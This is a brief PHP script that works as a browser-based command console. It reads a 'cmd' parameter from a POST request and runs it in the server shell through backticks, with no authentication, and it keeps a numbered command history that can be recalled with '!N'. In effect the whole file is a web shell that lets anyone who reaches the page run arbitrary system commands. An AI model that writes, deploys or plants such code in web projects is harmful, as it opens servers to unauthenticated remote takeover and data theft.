<?php
	$cmd = $_POST["cmd"];
	//$cmd = "!3";

if(preg_match("/^!(\d+)$/", $cmd, $match)){
	$cmd = loadCmd($match[1]);
	//	print $cmd; exit();
 }

// record the command in history
$res = false;
$res = exec("tail history.txt");
if($res){
	$tmp = explode("\t", $res);
	$i = intval($tmp[0]) + 1;
 }else{
	$i = 1;
 }
file_put_contents("history.txt", "$i\t$cmd\n", FILE_APPEND);



// execute the command
if($cmd == "history"){
	$res = file_get_contents("history.txt");
 }else{
	$res = `$cmd`;
 }



$res = nl2br(htmlspecialchars($res));
print '<span class="res">'.$res."</span><br />";

function loadCmd($num){
	$cmd = "";

	$io = fopen("history.txt", "r");
	if($io){
		while(!feof($io)){
			$line = rtrim(fgets($io));
			$tmp = explode("\t", $line);
			if($tmp[0] == $num){
				$cmd = $tmp[1];
				break;
			}
		}
		fclose($io);
	}
	return $cmd;
}

?>